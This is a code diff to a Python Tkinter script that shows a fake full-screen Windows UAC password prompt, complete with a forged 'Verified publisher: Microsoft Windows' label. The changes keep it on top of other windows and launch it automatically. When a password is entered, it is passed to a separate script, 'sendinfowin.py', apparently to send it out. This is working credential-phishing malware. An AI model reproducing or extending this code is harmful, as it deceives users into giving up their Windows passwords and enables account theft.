@@ -5,6 +5,8 @@ import subprocess
 import sys
 import ctypes
 from ctypes import wintypes
+import os
+os.chdir(os.path.dirname(os.path.abspath(__file__)))
 windll.shcore.SetProcessDpiAwareness(1)
 
 valid = True
@@ -132,7 +134,7 @@ def on_button1_click(button_text):
     global valid
     valid = is_valid_password (user, pword)
     if valid:
-        other_script_path = r'C:\Users\Public\Loki\sendinfowin.py'
+        other_script_path = r'sendinfowin.py'
         subprocess.call ([sys.executable, other_script_path, pword])
         root.destroy ()
     else:
@@ -154,7 +156,7 @@ def create_uac_box(width_percent, height_percent1, height_percent2):
 
     # Create the main window
     global root, bottom_frame, top_frame
-    root = Tk()
+    root = Toplevel()
 
     global screen_width, screen_height
     screen_width = root.winfo_screenwidth()
@@ -163,6 +165,7 @@ def create_uac_box(width_percent, height_percent1, height_percent2):
     root.overrideredirect(True)
     root.geometry(f"{screen_width}x{screen_height}")
     root.wm_attributes("-transparentcolor", "bisque")
+    root.wm_attributes("-topmost", True)
 
     columns = []
     for i in range(5):
@@ -226,7 +229,7 @@ def create_uac_box(width_percent, height_percent1, height_percent2):
     label_btext1 = "Windows Settings"
     label_bottom1 = Label(bottom_frame, text=label_btext1, font=('Quebec Serial', 18), foreground="black", bg='#e6e6e6')
     label_bottom1.place(relx=0.18, rely=ys[1], anchor="w")
-    make_label(bottom_frame, r'C:\Users\Public\Loki\settings.png', 100, 95, 0.04, ys[1])
+    make_label(bottom_frame, "settings.png", 100, 95, 0.04, ys[1])
     label_btext2 = "Verified publisher: Microsoft Windows"
     label_bottom2 = Label(bottom_frame, text=label_btext2, font=('Quebec Serial', 14), foreground="black", bg='#e6e6e6')
     label_bottom2.place(relx=0.04, rely=ys[2], anchor="w")
@@ -275,3 +278,4 @@ def create_uac_box(width_percent, height_percent1, height_percent2):
 
 def show ():
     create_uac_box (0.4, 0.14, 0.6)
+show ()
